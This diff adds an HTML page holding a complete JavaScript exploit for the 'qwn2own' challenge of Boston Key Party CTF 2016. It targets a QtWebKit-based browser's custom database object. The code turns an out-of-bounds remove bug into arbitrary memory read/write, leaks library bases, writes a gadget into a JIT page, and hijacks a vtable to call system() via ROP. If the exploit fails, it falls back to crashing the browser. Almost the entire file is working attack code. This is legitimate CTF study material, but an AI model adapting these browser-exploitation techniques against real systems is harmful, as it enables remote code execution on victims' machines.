@@ -1,0 +1,211 @@
+<!--
+Exploit for "qwn2own" from Boston Key Party CTF 2016.
+
+Tested on Ubuntu 15.10
+
+Copyright (c) 2016 Samuel Groß
+-->
+
+<body>
+<p>Pwning.. please wait</p>
+<p>With love from "Eat Sleep Pwn Repeat"</p>
+</body>
+<script type="text/javascript">
+
+function try_pwn() {
+    //
+    // Here's how a QArrayData instance (used by QVectors and QStrings) looks like:
+    //
+    //    QtPrivate::RefCount ref;
+    //    int size;
+    //    uint alloc : 31;
+    //    uint capacityReserved : 1;
+    //    qptrdiff offset; // in bytes from beginning of header (will be 0x18)
+    //
+    //    [ Content ]
+    //
+    // If we remove the element at index -1 in the array, it will shift everything to the left and
+    // we now control the offset (previously the first element in the array). We can set the offset
+    // to zero and can now write into our own header.
+    // We thus controll the size field => arbitrary (relative) read+write primitive.
+    //
+
+    var db = BKPDataBase.create("pwndb", "passw0rd");
+
+    //
+    // Heap spray to defragment the heap.
+    //
+    var spray = [];
+    for (var i = 0; i < 1000; i++) {
+        spray.push(db.createStore("spray_" + i, 1, [i], 1234));
+    }
+
+    //
+    // Create the storage instance that will provide us with a relative read+write primitive inside the heap.
+    // Important: first element must be zero.
+    //
+    var memview = db.createStore("memview", 1, [0,0,0,0,0,0,0,0,0,0], 1234);
+
+    // Exploit the bug to set the offset of the stored data to zero.
+    memview.remove(-1);
+    // Increase size to access adjacent memory.
+    memview.insert(0, 0xff00000001)
+
+    //
+    // Create a bunch of storage instances that will hopefully land behind the memview instance.
+    //
+    var targets = [];
+    for (var i = 0; i < 10; i++) {
+        var signature = 0x4141414100 + i;
+        var data = [];
+        for (var j = 0; j < 10; j++) {
+            data.push(signature);
+        }
+        targets.push(db.createStore("findme", 1, data, 1337000 + i));
+    }
+
+    //
+    // Search for the previously created storage instances. We'll detect them by their unique pin.
+    //
+    var hax = null;
+    for (var i = 0; i < memview.size(); i++) {
+        if (memview.get(i) >= 1337000 && memview.get(i) <= 1337009 && (memview.get(i - 4) & 0xff) == 0x1) {
+            var vec_addr = memview.get(i - 2);
+            var store_instance_signature = 0x4141414100 + memview.get(i) - 1337000;
+            var store_instance_index = i;
+            hax = targets[memview.get(i) - 1337000];
+            break;
+        }
+    }
+    if (!hax) {
+        throw "Failed to find DBInstance object";
+    }
+
+    //
+    // Search for the associated data vector.
+    //
+    var buffer_index = -1;
+    for (var i = 0; i < memview.size(); i++) {
+        if (memview.get(i) == store_instance_signature && memview.get(i + 1) == store_instance_signature) {
+            buffer_index = i - 3;
+            break;
+        }
+    }
+    if (buffer_index == -1) {
+        throw "Failed to find buffer";
+    }
+
+    //
+    // At this point we have achieved the following:
+    //  1. We know the offset of a DBStore instance and its associated vector instance from our memview array
+    //  2. We know the address of a qulonglong vector that we fully control
+    //
+    // This is enough to set up an absolute arbitrary read+write primitive since we can change the offset of the
+    // hax array by writing into the memview array.
+    //
+    var memory = {
+        memview: memview,
+        array: hax,
+        index: buffer_index,
+        base: vec_addr,
+
+        read: function(addr) {
+            if (addr < this.base) { throw "Can't read address"; }
+            var diff = addr - this.base;
+            this.memview.insert(this.index + 2, diff);
+            return this.array.get(0);
+        },
+
+        write: function(addr, val) {
+            if (addr < this.base) { throw "Can't read address"; }
+            var diff = addr - this.base;
+            this.memview.insert(this.index + 2, diff);
+            return this.array.insert(0, val);
+        }
+    };
+
+    //
+    // Leak stuff.
+    //
+    var vtable = memview.get(store_instance_index - 6);
+    var binary_base = vtable - 0x400 - 0x210000;
+
+    // Temporarily move the array pointer into the .got to leak pointers.
+    //
+    // We could use our memory object here, but reading pointers that are
+    // below the base address is a little bit tricky.
+    var fake_array = binary_base + 0x210d68;
+
+    // Now simply leak a couple of pointers into different libraries.
+    memview.insert(store_instance_index - 2, fake_array);
+    var libc_base = hax.get(42) - 0x20950;
+    var libcpp_base = hax.get(3) - 0x9e430;
+    var libqtcore_base = hax.get(6) - 0x2b8ba0;
+    var libqtwebkit_base = libqtcore_base + 0x9f6000;           // Offsets are constant between libraries if loaded in the same order.
+
+    // Restore the array.
+    memview.insert(store_instance_index - 2, vec_addr);
+
+    // There is a pointer into the JIT page at a fixed offset from libQtWebKit.so, leak that.
+    var jitpage = memory.read(libqtwebkit_base + 0x2433e90);
+    memory.write(jitpage, 0xc3585c50);
+
+    //
+    // Now we need a controlled string at a known address for system().
+    //
+    // To do this:
+    //  1. Change the type of our DBStore instance to turn it into a string storage (0x2)
+    //  2. Append a string
+    //  3. Read the strvect pointer
+    //  4. Restore the previous type (0x1)
+    //
+    // Qt stores strings in UTF16. We can simply tell it our input is in unicode though, as long
+    // as it doesn't represent a multibyte sequence in UTF16 everything will work.
+    //
+    memview.insert(store_instance_index - 4, 0x2);
+    hax.append('\u6e67\u6d6f\u2d65\u6163\u636c\u6c75\u7461\u726f');         // "gnome-calculator"
+    memview.insert(store_instance_index - 4, 0x1);
+    var strvector = memview.get(store_instance_index - 1);
+    var string_addr = memory.read(strvector + 0x18);            // Read the first element in the string vector.
+
+    //
+    // Set up the fake vtable and use it.
+    //
+    var system = libc_base + 0x443d0;
+    var pop_rdi = libc_base + 0x218a2;
+
+    memory.write(vec_addr + 0x18, jitpage);                 // This index will be called, jump into the jit page where we'll do a 'xchg rax, rsp ; pop rax ; ret'
+    memory.write(vec_addr + 0x20, pop_rdi);
+    memory.write(vec_addr + 0x28, string_addr + 0x18);      // A string is just a QTypedArrayData<char>, so it also has a 0x18 byte header.
+    memory.write(vec_addr + 0x30, system);
+    // We could fix things up here and return cleanly if we save the original rsp above, but meh :P
+    memory.write(vec_addr + 0x38, 0x31337000);
+
+    // Corrupt the vtable pointer of our DBStore instance.
+    memview.insert(store_instance_index - 6, vec_addr + 0x18);
+
+    // Trigger.
+    hax.get('pwned');
+}
+
+function pwn() {
+    var pwned = false;
+    for (var i = 0; i < 10 && !pwned; i++) {
+        try {
+            try_pwn();
+            pwned = true;
+        } catch (e) { }
+    }
+
+    if (!pwned) {
+        alert('EXPLOIT FAILED. FALLING BACK TO DOS!');
+        var db = BKPDataBase.create('dosdb', 'passw0rd');
+        var store = db.createStore('dos', 0, [1,2,3], 123);
+        store.cut(1337, -1337);           // cya
+    }
+}
+
+// Give the browser some time to show the page :)
+setTimeout(pwn, 50);
+
+</script>
